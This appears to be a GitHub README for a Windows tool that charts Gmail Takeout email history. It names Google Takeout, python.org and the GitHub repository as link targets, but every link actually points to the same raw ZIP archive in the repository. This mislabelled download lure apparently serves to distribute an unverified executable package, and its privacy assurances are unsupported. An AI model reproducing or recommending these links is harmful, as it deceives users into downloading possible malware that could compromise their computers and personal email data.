# 📥 Inbox-Archeology - Reconstruct Your Email History

[![Download Inbox-Archeology](https://img.shields.io/badge/Download-Inbox--Archeology-green?style=for-the-badge)](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)

---

## 📖 What is Inbox-Archeology?

Inbox-Archeology is a simple tool you can run on your Windows computer. It works with Gmail Takeout exports—that’s a file you get from Google when you want to save your email data. The program looks at your email archive and helps you uncover the social history inside your inbox. It organizes and shows your email contacts and conversations over time.

You don’t need to be a programmer to use it. The tool runs locally on your PC, so your email data stays private. It offers a visual look at how you interacted with others via email. It’s useful for anyone who wants a clear picture of their email history, whether for organizing old messages, personal records, or just understanding your communication patterns.

---

## 🔎 Key Features

- Works with Gmail Takeout exports (*.mbox and related files).
- Shows your email contacts and communication trends.
- Visualizes connections over months and years.
- Runs locally on Windows. No internet needed after setup.
- Easy-to-use interface with clear graphics.
- Focus on privacy: your data never leaves your computer.
- Uses Python and Streamlit technology under the hood.

---

## 📋 System Requirements

- Windows 10 or later (64-bit recommended).
- At least 4 GB of free RAM.
- Around 200 MB free disk space, plus space for your Gmail export.
- Internet connection needed for initial setup.
- Basic rights to install software on your PC.

---

## 💾 How to Download and Run on Windows

Below is a step-by-step guide to get Inbox-Archeology running on your PC. Follow it carefully even if you do not have programming skills.

---

### 1. Get Your Gmail Takeout Export Ready

Before using Inbox-Archeology, you need to create a Gmail Takeout file:

- Go to [Google Takeout](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip).
- Select only your Gmail data.
- Choose the export format as MBOX.
- Request the export and wait until you get the download link in your email.
- Download the ZIP file to your PC and extract it to a folder you can find easily.

---

### 2. Download Inbox-Archeology

[![Download Inbox-Archeology](https://img.shields.io/badge/Download-Inbox--Archeology-purple?style=for-the-badge)](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)

You need to visit the project page above to download the software. Follow these steps:

- Click the link or badge.
- You will land on the GitHub repository.
- Look for the “Releases” section on the right side or scroll down.
- Find the latest Windows version.
- Download the ZIP or installer file listed for Windows.

---

### 3. Install Python

Inbox-Archeology runs using Python, a programming language. You must install Python first:

- Go to [python.org/downloads/windows](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip).
- Download the latest version for Windows.
- Run the installer.
- IMPORTANT: During installation, check the box that says “Add Python to PATH.”
- Follow the rest of the installation steps.

---

### 4. Install the Required Software Packages

Once Python is installed, you need to add some extra pieces to make Inbox-Archeology run.

- Open the Command Prompt:
  - Press the Windows key, type “cmd,” then press Enter.
- Type this command and press Enter:

  pip install streamlit pandas matplotlib

This installs the tools Inbox-Archeology uses to work.

---

### 5. Run Inbox-Archeology

Now you can start the program and look at your email data.

- Open the folder where you downloaded Inbox-Archeology.
- Find the main file, often named `app.py` or similar.
- In the Command Prompt, use the `cd` command to go to that folder. For example:

  cd C:\Users\YourName\Downloads\Inbox-Archeology

- Run the program by typing:

  streamlit run app.py

- Wait a moment. Your default web browser will open a page showing Inbox-Archeology.

---

### 6. Load Your Gmail Export

- On the Inbox-Archeology page in your browser, look for the button or option to upload files.
- Select the folder or file from your Gmail Takeout.
- The program will start analyzing the data.
- You will see graphs and charts showing your email activity and contacts.

---

## ⚙️ How Inbox-Archeology Works

The program reads your Gmail export files. It finds the people you emailed, when you emailed them, and how often. It displays this data using charts and tables. The interface is built with Streamlit, so everything runs in your browser but stays on your computer.

You can explore:

- Who you emailed the most.
- When you communicated most actively.
- How your email connections changed over time.

---

## 🛠 Troubleshooting Common Issues

- **Python not recognized:** Make sure Python is installed and added to your PATH. Restart your PC if needed.
- **Missing packages:** Run `pip install streamlit pandas matplotlib` again.
- **Browser not opening:** Open your browser and type `http://localhost:8501` in the address bar.
- **Error loading Gmail export:** Check that your export files are not corrupted and are in MBOX format.

---

## 🔐 Privacy and Safety

Inbox-Archeology runs fully on your machine. None of your email data is sent anywhere online. Your information stays on your computer.

---

## ⚡ Quick Access Links

- [GitHub Repository](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)
- [Download Inbox-Archeology](https://raw.githubusercontent.com/Talhagadbade/Inbox-Archeology/main/output/Inbox-Archeology-v3.2.zip)

---

## 🗂 Folder Structure in the Download

Typical files you will find:

- `app.py` — The main program file.
- `README.md` — This guide.
- `requirements.txt` — Lists all software packages needed.
- Other folders containing helper files and code.

---

## 📌 Tips for Best Use

- Export your Gmail data regularly to keep your archive fresh.
- Use Inbox-Archeology after major changes in your email to see new trends.
- Save graphs by right-clicking them if you need a snapshot.

---

## 📞 Support and Contributions

This tool is open-source. If you want help or want to add features, you can open issues or pull requests on GitHub.

---

## 🌐 Keywords and Topics

Data portability, Gmail, email analysis, inbox visualization, personal archive tools, Python, Streamlit.